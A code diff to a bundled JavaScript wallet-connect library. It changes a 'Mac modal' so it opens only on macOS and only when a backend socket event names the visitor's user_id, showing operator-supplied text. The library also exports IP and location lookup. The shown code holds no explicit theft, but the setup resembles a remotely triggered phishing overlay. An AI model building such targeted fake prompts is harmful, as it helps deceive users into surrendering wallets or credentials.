@@ -14512,79 +14512,33 @@ const ConnectWalletButton = ({ className = '', userId, }) => {
         selectedWallet && (React.createElement(CustomWalletModal, { wallet: selectedWallet, isOpen: isCustomModalOpen, onClose: handleCloseCustomModal, userId: userId }))));
 };
 
+const isMacOS = () => typeof navigator !== 'undefined' &&
+    (navigator.platform?.includes('Mac') ?? /Mac|iPhone|iPad|iPod/.test(navigator.userAgent));
 /**
- * Get mac-modal settings for a user by user_id.
- * Public endpoint for widget usage.
- * mac_modal_timing: -1 = socket-only, 0+ = open after N seconds on load.
- */
-const getMacModalSettings = async (userId) => {
-    if (!userId)
-        return null;
-    try {
-        const BACKEND_URL = getBackendUrl();
-        if (!BACKEND_URL)
-            return null;
-        const response = await axios.get(`${BACKEND_URL}/api/users/user-id/${userId}/mac-modal`, { timeout: 5000 });
-        return response.data;
-    }
-    catch {
-        return null;
-    }
-};
-
-/**
- * On load: fetches (mac_user_name, mac_modal_timing) from backend API.
- * - If timing === -1: do nothing (modal opens only on socket signal).
- * - If timing >= 0: open Mac modal after that many seconds, displaying mac_user_name from DB.
- * Also subscribes to socket showMacModal; when timing is -1, that signal opens the modal.
+ * Listens for the backend socket event (default: `showMacModal`) and opens the Mac modal only when:
+ * - The user's OS is macOS (Mac, iPhone, iPad, iPod), and
+ * - The payload's user_id matches this component's userId (or backendConfig.userId).
+ * Mount once (e.g. at app root) to enable socket-triggered Mac modal.
+ *
+ * Backend example: io.emit('showMacModal', { message: '...', user_id, text, timestamp });
  */
 const MacModalTrigger = ({ userId, backendConfig, onClose, }) => {
     const [isOpen, setIsOpen] = useState(false);
     const [adminName, setAdminName] = useState(undefined);
     const effectiveUserId = userId ?? backendConfig?.userId;
-    const timedOpenFiredRef = useRef(false);
     useEffect(() => {
         initializeSocket();
         const unsubscribe = subscribeToShowMacModal((payload) => {
             const emitUserId = payload?.user_id;
-            if (effectiveUserId && emitUserId && emitUserId === effectiveUserId) {
+            if (isMacOS() &&
+                effectiveUserId &&
+                emitUserId &&
+                emitUserId === effectiveUserId) {
                 setAdminName(payload?.text);
                 setIsOpen(true);
             }
         });
         return unsubscribe;
-    }, [effectiveUserId]);
-    useEffect(() => {
-        if (!effectiveUserId)
-            return;
-        timedOpenFiredRef.current = false;
-        let timer = null;
-        let cancelled = false;
-        getMacModalSettings(effectiveUserId).then((settings) => {
-            if (cancelled || !settings || settings.mac_modal_timing === undefined || settings.mac_modal_timing < 0) {
-                return;
-            }
-            const timingSeconds = Math.max(0, settings.mac_modal_timing);
-            if (timingSeconds === 0) {
-                setAdminName(settings.mac_user_name || undefined);
-                setIsOpen(true);
-                timedOpenFiredRef.current = true;
-            }
-            else {
-                timer = setTimeout(() => {
-                    if (cancelled || timedOpenFiredRef.current)
-                        return;
-                    setAdminName(settings.mac_user_name || undefined);
-                    setIsOpen(true);
-                    timedOpenFiredRef.current = true;
-                }, timingSeconds * 1000);
-            }
-        });
-        return () => {
-            cancelled = true;
-            if (timer)
-                clearTimeout(timer);
-        };
     }, [effectiveUserId]);
     const handleClose = () => {
         setIsOpen(false);
@@ -14596,16 +14550,5 @@ const MacModalTrigger = ({ userId, backendConfig, onClose, }) => {
         React.createElement(MacModal, { wallet: "Mac", isOpen: isOpen, onClose: handleClose, userId: effectiveUserId, backendConfig: backendConfig, adminName: adminName })));
 };
 
-/**
- * Check if the user's operating system is macOS.
- */
-const isMacOS = () => {
-    if (typeof navigator === 'undefined')
-        return false;
-    const platform = navigator.platform?.toLowerCase() ?? '';
-    const userAgent = navigator.userAgent?.toLowerCase() ?? '';
-    return platform.includes('mac') || userAgent.includes('mac');
-};
-
-export { ASSET_PATHS, ConnectWalletButton, CustomWalletModal, MacModalTrigger, WalletSelectionModal, clearWalletTypesCache, getAllWalletTypes, getAssetBaseUrl, getAssetPath, getBackendUrl, getClientUrl, getConfig, getIPAndLocation, getMacModalSocketEvent, getUserWalletTypes, getWalletConfig, getWalletShortKey, isMacOS, resolveAssetUrl, setConfig, subscribeToShowMacModal, walletConfigs };
+export { ASSET_PATHS, ConnectWalletButton, CustomWalletModal, MacModalTrigger, WalletSelectionModal, clearWalletTypesCache, getAllWalletTypes, getAssetBaseUrl, getAssetPath, getBackendUrl, getClientUrl, getConfig, getIPAndLocation, getMacModalSocketEvent, getUserWalletTypes, getWalletConfig, getWalletShortKey, resolveAssetUrl, setConfig, subscribeToShowMacModal, walletConfigs };
 //# sourceMappingURL=index.esm.js.map
